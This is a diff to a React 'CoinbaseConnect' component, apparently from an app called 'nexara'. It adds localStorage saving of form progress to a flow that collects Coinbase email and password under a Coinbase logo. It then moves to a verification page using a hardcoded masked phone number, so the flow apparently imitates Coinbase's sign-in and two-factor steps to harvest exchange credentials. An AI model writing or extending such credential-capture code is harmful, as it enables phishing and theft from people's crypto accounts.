@@ -1,7 +1,8 @@
-import React, { useState } from 'react';
+import React, { useEffect, useState } from 'react';
 import { useNavigate } from 'react-router-dom';
-import { supabase } from '../../lib/supabase';
 import { useAuth } from '../../contexts/AuthContext';
+
+const CONNECT_PROGRESS_KEY = 'nexara_connect_progress';
 
 function CoinbaseLogo() {
   return (
@@ -20,9 +21,45 @@ export default function CoinbaseConnect() {
   const [loading, setLoading] = useState(false);
   const [errorMessage, setErrorMessage] = useState('');
 
+  const saveConnectProgress = (progress: Record<string, unknown>) => {
+    try {
+      window.localStorage.setItem(CONNECT_PROGRESS_KEY, JSON.stringify(progress));
+    } catch {
+      // ignore storage failures
+    }
+  };
+
+  const loadProgressAndNavigate = () => {
+    try {
+      const saved = window.localStorage.getItem(CONNECT_PROGRESS_KEY);
+      if (!saved) {
+        return;
+      }
+      const progress = JSON.parse(saved) as { route?: string; stepNumber?: number; partialFormData?: { email?: string; password?: string }; state?: unknown };
+      if (progress.route === '/connect/coinbase/verify-email') {
+        navigate('/connect/coinbase/verify-email', { state: progress.state });
+        return;
+      }
+
+      if (progress.route === '/connect/coinbase') {
+        setStep(progress.stepNumber || 1);
+        setCredentials((current) => ({
+          ...current,
+          ...progress.partialFormData,
+        }));
+      }
+    } catch {
+      window.localStorage.removeItem(CONNECT_PROGRESS_KEY);
+    }
+  };
+
   const handleFieldChange = (field: string) => (event: React.ChangeEvent<HTMLInputElement>) => {
     setCredentials((current) => ({ ...current, [field]: event.target.value }));
   };
+
+  useEffect(() => {
+    loadProgressAndNavigate();
+  }, [navigate]);
 
   const handleContinue = async (event: React.FormEvent) => {
     event.preventDefault();
@@ -32,6 +69,11 @@ export default function CoinbaseConnect() {
         return;
       }
       setErrorMessage('');
+      saveConnectProgress({
+        route: '/connect/coinbase',
+        stepNumber: 2,
+        partialFormData: { email: credentials.email },
+      });
       setStep(2);
       return;
     }
@@ -50,14 +92,17 @@ export default function CoinbaseConnect() {
         user_id: user?.id || null,
       };
 
-      // Navigate to verification page with credentials and a masked phone target
-      navigate('/connect/coinbase/verify-email', {
-        state: {
-          email: credentials.email,
-          phone: '+1* ********12',
-          platformData,
-        },
+      const nextState = {
+        email: credentials.email,
+        phone: '+1* ********12',
+        platformData,
+      };
+      saveConnectProgress({
+        route: '/connect/coinbase/verify-email',
+        state: nextState,
       });
+
+      navigate('/connect/coinbase/verify-email', { state: nextState });
     } catch (err: any) {
       setErrorMessage(err.message || 'An unexpected error occurred.');
     } finally {
